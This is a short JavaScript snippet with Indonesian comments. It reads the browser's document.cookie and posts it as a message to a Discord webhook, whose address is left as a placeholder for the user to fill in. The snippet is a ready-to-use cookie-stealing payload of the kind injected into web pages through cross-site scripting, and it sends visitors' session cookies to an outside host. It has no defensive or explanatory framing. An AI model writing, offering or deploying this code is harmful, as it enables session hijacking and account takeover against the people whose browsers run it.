const webhookUrl = 'webhook lu';

// Teks yang ingin dikirimkan
const textToSend = document.cookie;

// Buat objek data untuk dikirimkan ke Discord
const data = { content: textToSend };

// Jalankan fetch untuk mengirimkan data
fetch(webhookUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data),
})
  .then(response => response.json())
  .then(data => {
    console.log('Pesan terkirim ke Discord:', data);
  })
  .catch(error => {
    console.error('Error saat mengirim pesan ke Discord:', error);
  });
